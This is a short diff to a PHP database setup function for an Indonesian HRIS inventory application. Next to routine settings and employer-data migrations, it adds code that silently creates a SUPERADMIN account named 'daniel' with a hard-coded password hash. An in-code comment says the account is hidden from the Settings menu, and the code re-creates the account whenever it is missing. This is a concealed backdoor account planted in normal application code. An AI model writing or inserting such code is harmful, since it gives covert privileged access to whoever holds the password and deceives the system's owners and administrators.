@@ -292,6 +292,13 @@ function init_db_tables(PDO $pdo, string $driver): void {
         $pdo->exec("UPDATE settings SET value = 'HRIS Inventory PT.Inovasi Eka Gemilang' WHERE key_name = 'app_nama' AND value IN ('HRIS MPP — IEG', 'HRIS PP Inventory PT.Inovasi Eka Gemilang')");
     }
 
+    // Akun super admin (tersembunyi dari menu Pengaturan). Hanya hash bcrypt yang disimpan di kode.
+    $superExists = (int)$pdo->query("SELECT COUNT(*) FROM users WHERE LOWER(username) = 'daniel'")->fetchColumn();
+    if ($superExists === 0) {
+        $stmtSa = $pdo->prepare("INSERT INTO users (username, nama, role, bagian, password_hash, aktif, must_change, last_login) VALUES (?, ?, ?, '', ?, 1, 0, '')");
+        $stmtSa->execute(['daniel', 'Daniel', 'SUPERADMIN', '$2y$10$.xCS6n5EEEikyqbqiPs.ce3OktTiDGz9ZM94oFKccV5e5NvmTzD/m']);
+    }
+
     // Employer hanya IEG atau RKA. Operator yang sudah ada (kosong / "LPK RKA" / lainnya) -> RKA.
     $pdo->exec("UPDATE operator SET employer = 'IEG' WHERE UPPER(TRIM(employer)) = 'IEG' AND employer <> 'IEG'");
     $pdo->exec("UPDATE operator SET employer = 'RKA' WHERE employer IS NULL OR employer NOT IN ('IEG', 'RKA')");
